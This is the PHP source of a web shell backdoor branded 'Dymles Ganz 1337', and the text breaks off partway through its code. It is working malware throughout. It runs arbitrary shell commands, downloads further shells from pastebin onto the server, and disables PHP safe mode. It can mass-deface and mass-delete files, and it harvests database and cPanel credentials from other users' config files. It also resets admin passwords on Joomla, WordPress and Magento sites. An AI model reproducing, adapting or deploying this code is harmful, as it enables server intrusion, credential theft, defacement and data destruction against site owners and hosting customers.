<?php
######################
# DarkSkull7   #
# BraveXploiter #                  
######################
$auth_pass = "b947b4015b80966f3c853086af65f9b3";

session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);


$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 eror');
        exit;
    }
}

function login_shell() {
?>
<html>
<head>
<title>{ Skull Tujuh Shell }</title>
<style type="text/css">
html {
	margin: 20px auto;
	background: black;
	color: #FF0000 ;
	text-align: center;
}
header {
	color: #53FF00;
	margin: 10px auto;
}
input[type=password] {
	width: 250px;
	height: 25px;
	color: green;
	border: 1px dotted white;
	padding: 5px;
	margin-left: 20px;
	text-align: center;
}
</style>
<h1><div style="text-align: left;"></h1></div>
</head><center><body> <img src="https://f.top4top.io/p_31733zn611.jpeg" height="450" width="1000"><H1>Dymles Ganz 1337 Backdoor</body></center>
<form method="post">
<input type="password" name="pass">
</form>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>Dymles Ganz 1337 Backdoor</title>
<meta name='author' content='./Chu404'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html{
    background-color: black;
    color: white;
    font-family: 'Ubuntu';
    font-size: 13px;
    width: 100%;
}
li {
		display: inline;
		margin: 1px;
		padding: 1px;
	}
	#menu a {
	 	padding:2px 10px;
	 	margin:0; 
	 	background:black; 
	 	text-decoration:none; 
		letter-spacing:2px; 
		padding: 2px 10px;
		margin: 0;
		text-decoration: none;
		letter-spacing: 2px;
		border-radius: 2px;
		border-bottom: 2px solid green;
		border-top: 2px solid green;
		border-right: 2px solid green;
		border-left: 2px solid green;
	}
	#menu a:hover {
		background:black; 
		border-bottom:0px solid black; 
		border-top:0px solid black; 
	}
	hr {
		color: cyan;
	}
	table tr:first-child{	
		background: black;
		text-align: center;
		color: green;
	}
	table, th, td {
		border-collapse:collapse;
		font-family: Tahoma, Geneva, sans-serif;
		background: transparent;
		font-family: 'Share Tech Mono';
		font-size: 13px;
	}
	.table_home, .th_home, .td_home {
		border: 1px solid green;
	}
	th {
		padding: 10px;
	}
	a {
		color: cyan;
		text-decoration: none;
	}
	a:hover {
		color: cyan;
		text-decoration: underline;
	}
	b {
		color: cyan;
	}
	input[type=text], input[type=password],input[type=submit] {
		background: transparent; 
		color: cyan; 
		border: 1px solid green; 
		margin: 5px auto;
		padding-left: 5px;
		font-family: 'Share Tech Mono';
		font-size: 13px;
	}
	input[type=submit] {
		background: transparent; 
		color: cyan; 
		border: 1px solid green; 
		margin: 5px auto;
		padding-left: 5px;
		font-family: 'Share Tech Mono';
		font-size: 13px;
		cursor:pointer;
	}
	textarea {
		border: 1px solid green;
		width: 100%;
		height: 400px;
		padding-left: 5px;
		margin: 10px auto;
		resize: none;
		background: transparent;
		color: cyan;
		font-family: 'Share Tech Mono';
		font-size: 13px;
	}
	select {
		width: 152px;
		background: #000000; 
		color: blue; 
		border: 1px solid green; 
		margin: 5px auto;
		padding-left: 5px;
		font-family: 'Share Tech Mono';
		font-size: 13px;
	}
	option:hover {
		background: transparent;
		color: #000000;
	}
	.mybox{
		-moz-border-radius: 10px; 
		border-radius: 10px;
		border:1px solid green; padding:4px 2px;
		width:70%;
		line-height:24px;
		background:none;
		box-shadow: 0px 4px 2px white;
		-webkit-box-shadow: 0px 4px 2px green;
		-moz-box-shadow: 0px 4px 2px green;
	}
	.cgx2 {
		text-align: center;
		letter-spacing:1px;
		font-family: "orbitron";
		color: #ff0000;
		font-size:25px;text-shadow: 5px 5px 5px black;
	}
	.infoweb {
		border-right: 1px solid #00FFFF;
	}
</style>
</head><center><body> <img src="https://f.top4top.io/p_31733zn611.jpeg" height="450" width="1000"><H1>Dymles Ganz 1337</body></center>
<?php
if (file_exists("php.ini")){
}else{
$img = fopen('php.ini', 'w');
$sec = "safe_mode = OFF
disable_funtions = NONE";
fwrite($img ,$sec);
fclose($img);}		
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
    function UrlLoop($url,$type){

        $urlArray = array();

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);

        $regex='|<a.*?href="(.*?)"|';
        preg_match_all($regex,$result,$parts);
        $links=$parts[1];
        foreach($links as $link){
            array_push($urlArray, $link);
        }
        curl_close($ch);

        foreach($urlArray as $value){
            $lol="$url$value";
			if(preg_match("#$type#is", $lol)) {
				echo "$lol\r\n";
			}
        }
    }
function exe($cmd) { 	
if(function_exists('system')) { 		
		@ob_start(); 		
		@system($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('exec')) { 		
		@exec($cmd,$results); 		
		$buff = ""; 		
		foreach($results as $result) { 			
			$buff .= $result; 		
		} return $buff; 	
	} elseif(function_exists('passthru')) { 		
		@ob_start(); 		
		@passthru($cmd); 		
		$buff = @ob_get_contents(); 		
		@ob_end_clean(); 		
		return $buff; 	
	} elseif(function_exists('shell_exec')) { 		
		$buff = @shell_exec($cmd); 		
		return $buff; 	
	} 
}
function perms($file){
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function hdd($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
            curl_close($curl);
    return $content;
}
if(get_magic_quotes_gpc()) {
	function idx_ss($array) {
		return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
	}
	$_POST = idx_ss($_POST);
}
function CreateTools($names,$lokasi){
	if ( $_GET['create'] == $names ){
		$a= "".$_SERVER['SERVER_NAME']."";
$b= dirname($_SERVER['PHP_SELF']);
$c = "/coro.id/".$names.".php";
if (file_exists('coro.id/'.$names.'.php')){
	echo '<script type="text/javascript">alert("Done");window.location.href = "coro.id/'.$names.'.php";</script> ';
	}
	else {mkdir("coro.id", 0777);
file_put_contents('coro.id/'.$names.'.php', file_get_contents($lokasi));
echo ' <script type="text/javascript">alert("Done");window.location.href = "coro.id/'.$names.'.php";</script> ';}}}

CreateTools("wso","http://pastebin.com/raw/3eh3Gej2");
CreateTools("adminer"."https://www.adminer.org/static/download/4.2.5/adminer-4.2.5.php");
CreateTools("b374k","http://pastebin.com/raw/rZiyaRGV");
CreateTools("injection","http://pastebin.com/raw/nxxL8c1f");
CreateTools("promailerv2","http://pastebin.com/raw/Rk9v6eSq");
CreateTools("gamestopceker","http://pastebin.com/raw/QSnw1JXV");
CreateTools("bukapalapak","http://pastebin.com/raw/6CB8krDi");
CreateTools("tokopedia","http://pastebin.com/dvhzWgby");
CreateTools("encodedecode","http://pastebin.com/raw/wqB3G5eZ");
CreateTools("mailer","http://pastebin.com/raw/9yu1DmJj");
CreateTools("r57","http://pastebin.com/raw/G2VEDunW");
CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
CreateTools("bh","http://pastebin.com/raw/3L2ESWeu");
CreateTools("dhanus","http://pastebin.com/raw/v4xGus6X");
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($_GET['dir']);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=lime>OFF</font>";
$ling="http://".$_SERVER['SERVER_NAME']."" .$_SERVER['PHP_SELF']."?create";
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$d0mains = @file("/etc/named.conf");
			$users=@file('/etc/passwd');
        if($d0mains)
        { 
			$count;  
			foreach($d0mains as $d0main)
			{
				if(@ereg("zone",$d0main))
				{
					preg_match_all('#zone "(.*)"#', $d0main, $domains);
					flush();
					if(strlen(trim($domains[1][0])) > 2)
					{
						flush();
						$count++;
			   		} 
			   	}
			}
		}



echo "<tr><td>MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl </td></tr>";
echo "<br><tr><td>Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "<tr><td><form method='post' action='?dir=$dir&do=cmd'>
	Command : 
	<input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
	</form></td></tr>";
echo "</table><hr>";
echo "<center>";
echo "<ul>";
echo "<li>[ <a style='color: yellow;' href='?'>Home</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=upload'>Upload</a> ]</li>";
echo "<li>[ <a style='color: red;' href='?logout=true'>Logout</a> ]</li>";
echo "<br><br><a style='color: #4BFF00;' href='?dir=$dir&do=infosys'>Info Server</a> </li>";
echo "<br><br>li>[ <a style='color: silver;' href='?dir=$dir&do=cmd'>Command</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=mass_deface'>Mass Deface</a> ]</li>";
echo "<li>[ <a  style='color: silver;'  href='?dir=$dir&do=mass_delete'>Mass Delete</a> ]</li>";
echo "<li>[ <a  style='color: silver;'  href='?dir=$dir&do=config'>Config</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=jumping'>Jumping</a> ]</li>";
echo "<br><br><li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
echo "<li>[ <a  style='color: silver;'  href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
echo "<li>[ <a  style='color: silver;'  href='?dir=$dir&do=cgi'>CGI Telnet</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=network'>network</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=adminer'>Adminer</a> ]</li>";
echo "<br><br><li>[ <a  style='color: silver;'  href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
echo "<li>[ <a  style='color: silver;'  href='?dir=$dir&do=auto_edit_user'>Edit User</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=auto_wp'>Edit Title WordPress</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=auto_dwp2'>WP Deface V.2</a> ]</li>";
echo "<li>[ <a  style='color: silver;' href='?dir=$dir&do=cpftp_auto'>CFTP Deface</a> ]</li>";
echo "</ul>";
echo "</center>";
echo "<hr>";

if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
elseif($_GET['do'] == 'upload') {
	echo "<center>";
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "Upload File:
	<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
	echo "</center>";
}
 elseif($_GET['do'] == 'cmd') {
    echo "<form method='post'>
    <font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
    <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
    </form>";
    if($_POST['do_cmd']) {
        echo "<pre>".exe($_POST['cmd'])."</pre>";
    }
} elseif($_GET['do'] == 'mass_deface') {
    function deface_masall($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                            $idx = deface_massal($dirc,$namafile,$isi_script);
                        }
                    }
                }
            }
        }
    }
    function deface ($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    file_put_contents($lokasi, $isi_script);
                } elseif($dirb === '..') {
                    file_put_contents($lokasi, $isi_script);
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            echo "[<font color=lime>DONE</font>] $lokasi<br>";
                            file_put_contents($lokasi, $isi_script);
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        if($_POST['tipe_deface'] == 'mahal') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            deface_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        } elseif($_POST['tipe_deface'] == 'murah') {
            echo "<div style='margin: 5px auto; padding: 5px'>";
            deface($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
            echo "</div>";
        }
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Tipe Sabun:</font><br>
    <input type='radio' name='tipe_deface' value='murah' checked>Biasa<input type='radio' name='tipe_deface' value='mahal'>Massal<br>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Index File:</font><br>
    <textarea name='script' style='width: 450px; height: 200px;'>Dymles Ganz 1337</textarea><br>
    <input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
    </form></center>";
    }
} elseif($_GET['do'] == 'mass_delete') {
    function hapus_massal($dir,$namafile) {
        if(is_writable($dir)) {
            $dira = scandir($dir);
            foreach($dira as $dirb) {
                $dirc = "$dir/$dirb";
                $lokasi = $dirc.'/'.$namafile;
                if($dirb === '.') {
                    if(file_exists("$dir/$namafile")) {
                        unlink("$dir/$namafile");
                    }
                } elseif($dirb === '..') {
                    if(file_exists("".dirname($dir)."/$namafile")) {
                        unlink("".dirname($dir)."/$namafile");
                    }
                } else {
                    if(is_dir($dirc)) {
                        if(is_writable($dirc)) {
                            if(file_exists($lokasi)) {
                                echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                                unlink($lokasi);
                                $LNX = hapus_massal($dirc,$namafile);
                            }
                        }
                    }
                }
            }
        }
    }
    if($_POST['start']) {
        echo "<div style='margin: 5px auto; padding: 5px'>";
        hapus_massal($_POST['d_dir'], $_POST['d_file']);
        echo "</div>";
    } else {
    echo "<center>";
    echo "<form method='post'>
    <font style='text-decoration: underline;'>Folder:</font><br>
    <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
    <font style='text-decoration: underline;'>Filename:</font><br>
    <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>
    <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
    </form></center>";
    }
} elseif($_GET['do'] == 'config') {
    $etc = fopen("/etc/passwd", "r");
    $LNX = mkdir("config", 0777);
    $isi_htc = "Options all\nRequire None\nSatisfy Any";
    $htc = fopen("config/.htaccess","w");
    fwrite($htc, $isi_htc);
    while($passwd = fgets($etc)) {
        if($passwd == "" || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_LNX) {
                $user_config_dir = "/home/$user_LNX/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_lnx/.my.cnf" => "cpanel",
                        "/home/$user_lnx/.accesshash" => "WHM-accesshash",
                        "/home/$user_lnx/public_html/vdo_config.php" => "Voodoo",
                        "/home/$user_lnx/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_lnx/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_lnx/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_lnx/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_lnx/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_lnx/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_lnx/public_html/forum/config.php" => "phpBB",
                        "/home/$user_lnx/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_lnx/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_lnx/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_lnx/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_lnx/public_html/configuration.php" => "Joomla",
                        "/home/$user_lnx/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_lnx/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_lnx/public_html/wp-config.php" => "WordPress",
                        "/home/$user_lnx/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_lnx/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_lnx/public_html/application/config/database.php" => "Ellislab");
                    foreach($grab_config as $config => $nama_config) {
                        $ambil_config = file_get_contents($config);
                        if($ambil_config == '') {
                        } else {
                            $file_config = fopen("config/$user_LNX-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }    
            }
        }
    }
    echo "<center><a href='?dir=$dir/config'><font color=lime>Done</font></a></center>";

        }elseif($_GET['do'] == 'infosys') {
 
echo '<center><div id="menu" >';
echo "<ul>";
echo "System: <font color=blue>".$kernel."</font><br>";
echo "User: <font color=blue>".$user."</font> (".$uid.") Group: <font color=blue>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=blue>".$ip."</font> | Your IP: <font color=blue>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo "HDD: <font color=blue>$used</font> / <font color=blue>$total</font> ( Free: <font color=blue>$freespace</font> )<br>";
echo "Safe Mode: $sm<br>";
echo "Disable Functions: $show_ds<br>";
echo "User: ".$user." (".$uid.") Group: ".$group." (".$gid.")<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
echo "<hr>";
 
 
} elseif($_GET['do'] == 'jumping') {
    $i = 0;
    echo "<pre><div class='margin: 5px auto;'>";
    $etc = fopen("/etc/passwd", "r");
    while($passwd = fgets($etc)) {
        if($passwd == '' || !$etc) {
            echo "<font color=red>Can't read /etc/passwd</font>";
        } else {
            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
            foreach($user_jumping[1] as $user_lnx_jump) {
                $user_jumping_dir = "/home/$user_LNX_jump/public_html";
                if(is_readable($user_jumping_dir)) {
                    $i++;
                    $jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    if(is_writable($user_jumping_dir)) {
                        $jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
                    }
                    echo $jrw;
                    if(function_exists('posix_getpwuid')) {
                        $domain_jump = file_get_contents("/etc/named.conf");
                        if($domain_jump == '') {
                            echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
                        } else {
                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                            foreach($domains_jump[1] as $dj) {
                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                                $user_jumping_url = $user_jumping_url['name'];
                                if($user_jumping_url == $user_LNX_jump) {
                                    echo " => ( <u>$dj</u> )<br>";
                                    break;
                                }
                            }
                        }
                    } else {
                        echo "<br>";
                    }
                }
            }
        }
    }
    if($i == 0) {
    } else {
        echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
    }
    echo "</div></pre>";
} elseif($_GET['do'] == 'auto_edit_user') {
    if($_POST['hajar']) {
        if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
            echo "username atau password harus lebih dari 6 karakter";
        } else {
            $user_baru = $_POST['user_baru'];
            $pass_baru = md5($_POST['pass_baru']);
            $conf = $_POST['config_dir'];
            $scan_conf = scandir($conf);
            foreach($scan_conf as $file_conf) {
                if(!is_file("$conf/$file_conf")) continue;
                $config = file_get_contents("$conf/$file_conf");
                if(preg_match("/JConfig|joomla/",$config)) {
                    $dbhost = ambilkata($config,"host = '","'");
                    $dbuser = ambilkata($config,"user = '","'");
                    $dbpass = ambilkata($config,"password = '","'");
                    $dbname = ambilkata($config,"db = '","'");
                    $dbprefix = ambilkata($config,"dbprefix = '","'");
                    $prefix = $dbprefix."users";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result['id'];
                    $site = ambilkata($config,"sitename = '","'");
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Joomla<br>";
                    if($site == '') {
                        echo "Sitename => <font color=red>error, gabisa ambil nama domain </font><br>";
                    } else {
                        echo "Sitename => $site<br>";
                    }
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/WordPress/",$config)) {
                    $dbhost = ambilkata($config,"DB_HOST', '","'");
                    $dbuser = ambilkata($config,"DB_USER', '","'");
                    $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                    $dbname = ambilkata($config,"DB_NAME', '","'");
                    $dbprefix = ambilkata($config,"table_prefix  = '","'");
                    $prefix = $dbprefix."users";
                    $option = $dbprefix."options";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[ID];
                    $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[option_value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain </font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Wordpress<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
                        echo "Status => <font color=lime>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
                    }
                    mysql_close($conn);
                } elseif(preg_match("/Magento|Mage_Core/",$config)) {
                    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
                    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
                    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
                    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
                    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
                    $prefix = $dbprefix."admin_user";
                    $option = $dbprefix."core_config_data";
                    $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                    $db = mysql_select_db($dbname);
                    $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
                    $result = mysql_fetch_array($q);
                    $id = $result[user_id];
                    $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
                    $result2 = mysql_fetch_array($q2);
                    $target = $result2[value];
                    if($target == '') {
                        $url_target = "Login => <font color=red>error, gabisa ambil nama domain </font><br>";
                    } else {
                        $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
                    }
                    $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
                    echo "Config => ".$file_conf."<br>";
                    echo "CMS => Magento<br>";
                    echo $url_target;
                    if(!$update OR !$conn OR !$db) {
                        echo "Status => <font color=red>".mysql_error()."</font><br><br>";
                    } else {
